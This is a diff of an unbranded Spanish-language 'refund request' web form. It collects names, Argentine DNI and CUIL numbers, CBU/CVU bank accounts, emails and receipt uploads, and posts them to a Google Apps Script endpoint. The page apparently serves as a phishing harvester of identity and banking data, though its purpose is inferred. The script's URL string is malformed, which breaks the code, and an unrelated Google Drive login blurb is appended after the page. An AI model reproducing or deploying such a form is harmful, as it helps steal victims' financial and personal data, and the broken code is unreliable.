@@ -4,310 +4,191 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Solicitud de Reintegro</title>
+ 
 <style>
-
 body {
-
   font-family: Arial, sans-serif;
-
   background: #f4f4f4;
-
   margin: 0;
-
   padding: 0;
-
 }
-
+ 
 .container {
-
   width: 90%;
-
   max-width: 420px;
-
   margin: 30px auto;
-
   background: white;
-
   padding: 25px;
-
   border-radius: 12px;
-
   box-shadow: 0 0 10px rgba(0,0,0,0.1);
-
 }
-
+ 
 .logo img {
-
   width: 120px;
-
   display: block;
-
   margin: 0 auto 20px;
-
 }
-
+ 
 h3 {
-
   text-align: center;
-
   margin-bottom: 20px;
-
 }
-
+ 
 input, select {
-
   width: 100%;
-
   padding: 12px;
-
   margin: 8px 0;
-
   border-radius: 6px;
-
   border: 1px solid #ccc;
-
   font-size: 15px;
-
 }
-
+ 
 button {
-
   width: 100%;
-
   padding: 12px;
-
   background: #007bff;
-
   color: white;
-
   border: none;
-
   border-radius: 6px;
-
   font-size: 16px;
-
   cursor: pointer;
-
 }
-
+ 
 button:disabled {
-
   background: #7aaef5;
-
   cursor: not-allowed;
-
 }
-
+ 
 .message {
-
   margin-top: 20px;
-
   text-align: center;
-
   font-size: 16px;
-
 }
-
+ 
 .message img {
-
   width: 80px;
-
   display: block;
-
   margin: 0 auto 10px;
-
 }
-
+ 
 .case {
-
   font-weight: bold;
-
   margin-top: 10px;
-
 }
-
+ 
 /* Loader */
-
 .loader {
-
   display: none;
-
   margin: 20px auto;
-
   border: 6px solid #f3f3f3;
-
   border-top: 6px solid #007bff;
-
   border-radius: 50%;
-
   width: 45px;
-
   height: 45px;
-
   animation: spin 1s linear infinite;
-
 }
-
+ 
 @keyframes spin {
-
   0% { transform: rotate(0deg); }
-
   100% { transform: rotate(360deg); }
-
 }
 </style>
 </head>
+ 
 <body>
+ 
 <div class="container">
+ 
 <div class="logo">
 <img src="logo.png" alt="Logo">
 </div>
+ 
 <h3>Solicitud de Reintegro</h3>
+ 
 <form id="formulario">
+ 
 <input type="text" name="nombre" placeholder="Nombre y apellido" required>
 <input type="text" name="dni" placeholder="DNI" required>
 <input type="text" name="cuil" placeholder="CUIL" required>
 <input type="text" name="cbu" placeholder="CBU/CVU" required>
 <input type="email" name="correo" placeholder="Correo electrónico" required>
-<input type="number" id="monto" placeholder="Monto solicitado" required>
+ 
 <label>Adjunta el comprobante</label>
-<input type="file" id="comprobanteFile" accept="image/*,.pdf">
+<input type="file" id="comprobanteFile" accept="image/*,.pdf" required>
+ 
 <button id="btnEnviar" type="submit">Enviar solicitud</button>
+ 
 </form>
+ 
 <div class="loader" id="loader"></div>
+ 
 <div class="message" id="mensaje"></div>
+ 
 </div>
+ 
 <script>
-
-const scriptURL = "https://script.google.com/macros/s/AKfycby_8Trwf22kANJs18t6BC6f1CVp6bEqvAcXUR0gYGXpNCvSnCszbZdOIJJh";
-
+ 
+const scriptURL = "https://script.google.com/macros/s/AKfycby_8Trwf22kANJs18t6BC6f1CVp6bEqvAcXUR0gYGXpNCvSnCszbZdOIJJhAa_qb-DLUg/exec%22;
+ 
 const form = document.getElementById("formulario");
-
 const mensaje = document.getElementById("mensaje");
-
 const loader = document.getElementById("loader");
-
 const btnEnviar = document.getElementById("btnEnviar");
-
-const montoInput = document.getElementById("monto");
-
-const comprobanteInput = document.getElementById("comprobanteFile");
-
-montoInput.addEventListener("input", function(){
-
-  const monto = parseFloat(montoInput.value) || 0;
-
-  if(monto > 70000){
-
-    comprobanteInput.required = true;
-
-  } else {
-
-    comprobanteInput.required = false;
-
-  }
-
-});
-
+ 
 function convertirBase64(file){
-
   return new Promise((resolve,reject)=>{
-
     const reader = new FileReader();
-
     reader.readAsDataURL(file);
-
     reader.onload = ()=> resolve(reader.result.split(',')[1]);
-
     reader.onerror = error => reject(error);
-
   });
-
 }
-
+ 
 form.addEventListener("submit", async function(e){
-
   e.preventDefault();
-
-  let base64 = "";
-
+ 
   const file = document.getElementById("comprobanteFile").files[0];
-
-  if(file){
-
-    base64 = await convertirBase64(file);
-
-  }
-
+  const base64 = await convertirBase64(file);
+ 
   const formData = new FormData(form);
-
   formData.append("comprobante", base64);
-
+ 
+  // Bloqueo del botón (solo una vez)
   btnEnviar.disabled = true;
-
   btnEnviar.textContent = "Enviando...";
-
   loader.style.display = "block";
-
+ 
   fetch(scriptURL,{
-
     method:"POST",
-
     body:formData
-
   })
-
   .then(res=>res.text())
-
   .then(result=>{
-
     loader.style.display = "none";
-
+ 
     if(result === "YA_EXISTE"){
-
       mensaje.innerHTML = `
 <img src="x-roja.png">
 <div>Ya registraste una solicitud en las últimas 24hs.</div>
-
       `;
-
     } else {
-
       mensaje.innerHTML = `
 <img src="tilde-verificacion.png">
 <div class="case">Número de caso: ${result}</div>
 <div>Estamos trabajando para resolver tu gestión. Puede demorar hasta 7 días hábiles.</div>
-<div style="margin-top:10px;">
-
-        Los reintegros se realizan únicamente mediante transferencia bancaria o acreditación en tarjeta de crédito.  
-
-        No se realizan pagos en efectivo ni mediante cheque.
-</div>
-
       `;
-
     }
-
     form.style.display="none";
-
   })
-
   .catch(()=>{
-
     loader.style.display = "none";
-
     mensaje.innerText="Error al enviar el formulario.";
-
     btnEnviar.disabled = false;
-
     btnEnviar.textContent = "Enviar solicitud";
-
   });
-
+ 
 });
 </script>
+ 
 </body>
 </html>
-Google Drive: inicio de sesión
-Accede a Google Drive con una cuenta de Google (para uso personal) o una cuenta de Google Workspace (para uso corporativo).
- 
